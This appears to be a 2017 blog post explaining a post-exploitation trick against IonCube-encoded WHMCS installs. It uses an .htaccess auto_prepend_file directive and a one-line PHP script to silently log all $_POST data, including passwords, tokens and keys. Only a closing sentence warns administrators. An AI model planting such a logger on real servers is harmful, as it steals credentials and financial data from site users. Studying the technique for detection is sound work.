---
layout: post
title: Being Evil against Encoded PHP Files
date: 2017-06-28 01:00 +0700
description: Post-Exploitation against Encoded Files (IonCube or Zend Guard) for Server-Side PHP $_POST Logging.
tags: 
    - post-exploitation
    - interception
    - ioncube
    - whmcs
#author: Nazariy Markuta
#comments: false
#share: true
image: /assets/img/being-evil-against-encoded-php-files
---
Lets say a server has been exploited and an attacker wants to intercept data coming from a web application in order to gain sensitive information such as plaintext server passwords. Lets also say that application is WHMCS. One of the requirements is [IonCube Loader](https://www.ioncube.com/php_encoder.php) which protects PHP source code from easy observation, theft and **change** by compiling into bytecode.

### Sample of WHMCS with IonCube encoded source code
![WHMCS IonCube sample]({{page.image}}/whmcs-ioncube-sample.png)

When an encoded Ioncube file is changed in any way a 500 internal server error occurs.

A simple trick of getting round files protected by IonCube or Zend Guard loaders for explicitly including our own code to perform malicious things, is by utilizing the PHP [**auto_prepend_file**](http://php.net/manual/en/ini.core.php#ini.auto-prepend-file "php manual") directive and the way a web server is configured. This of course means the attacker has already gained access and enough privileges. I've setup MAMP v4.1.1 running PHP v7.0.15 (Latest that Ioncube can support) with WHMCS v7.2.2.

When using PHP as an Apache module, you can change the PHP configuration settings using **.htaccess** files if AllowOverride Options is set. Example below shows a **.htaccess** file that sets two values under WHMCS installation document_root. 
* An include path that locates our script
* A filename that'll be automatically added before any PHP document

```
php_value include_path ".:/Applications/MAMP/htdocs/whmcs"
php_value auto_prepend_file "log.php"
```

A PHP script called **log.php** is created for storing $\_POST values.
```php
<?php file_put_contents('/Applications/MAMP/htdocs/whmcs/templates_c/post_data.txt', var_export($_POST, true)); ?>
```
For simplicity's sake, both .htaccess and log.php files are placed in the same path. 

### Example of Intercepted Data
![WHMCS IonCube post\_data.log]({{page.image}}/whmcs-ioncube-data.png)

ALL values that are sent through the super global variable $\_POST are intercepted. Given the nature of WHMCS as a hosting Content Management System it can be extremely useful for attackers to implement such loggers. Plaintext; **server configurations, passwords, financial information, tokens, private keys** and much more.


In case of Nginx or other web servers, the attacker would change the main PHP configuration (**php.ini**) file by adding a value to the **auto_prepend_file** directive. Keeping in mind that this would effect every PHP script when loaded, the attacker may adjust the script to only target specific variables, or else the log file will be filled with junk and uninteresting information, not to mention increasing in size quite quickly.


Administrators should be wary of **auto_prepend_file** and **auto_append_file** PHP directives and its potential uses to attackers, backdoors of this nature can be particularly harmful to organisations processing sensitive data.
